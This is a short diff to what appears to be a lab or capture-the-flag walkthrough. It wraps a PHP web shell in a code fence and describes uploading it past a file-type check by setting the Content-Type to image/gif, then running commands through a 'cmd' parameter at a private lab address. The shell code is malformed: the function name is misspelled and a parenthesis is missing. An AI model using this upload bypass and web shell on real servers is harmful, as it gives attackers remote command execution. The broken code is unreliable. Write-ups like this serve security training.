@@ -45,12 +45,13 @@ from upload page , we found out we cant upload php file
 send request to repeater ---> change content-type to image/gif
 
 content --> 
+```php
 <?php
     echo '<pre>';
     passtrhu(system($_GET['cmd']);
     echo '</pre>';
 ?>
-
+```
 and you will successfully upload php file 
 
 in response copy that and new repeater tab , http://192.168.100.172/adminstration/upload/files/<your filename>?cmd=id
